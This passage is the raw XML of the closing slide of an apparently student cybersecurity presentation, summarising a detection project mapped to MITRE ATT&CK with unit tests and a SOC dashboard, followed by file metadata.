            <a:endParaRPr lang="en-US" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Threat Intelligence Connection: Directly mapped detected vectors to MITRE ATT&amp;CK Tactic TA0003.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>- Operational Transparency: Verified 4/4 passing unit tests, live baseline creation, and SOC dashboard visualizer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>---------------------------------------------------------------------------------------------------------</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thank You!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Questions &amp; Answers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Presented by: Arun Kumar &amp; Abhishek Sharma</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Department of Computer Science and Engineering (Cyber Security)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1350">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Model Institute of Engineering &amp; Technology (Autonomous), Jammu</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1350">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="387632361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AcademicPresentation3">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18394</TotalTime>
  <Words>2945</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>218</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Tw Cen MT</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>1_AcademicPresentation3</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</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sahil.adm@mietjammu.in</dc:creator>
  <cp:lastModifiedBy>arun dogra</cp:lastModifiedBy>
  <cp:revision>297</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-08-09T07:27:56Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-21T00:51:27Z</dcterms:modified>
</cp:coreProperties>
</file>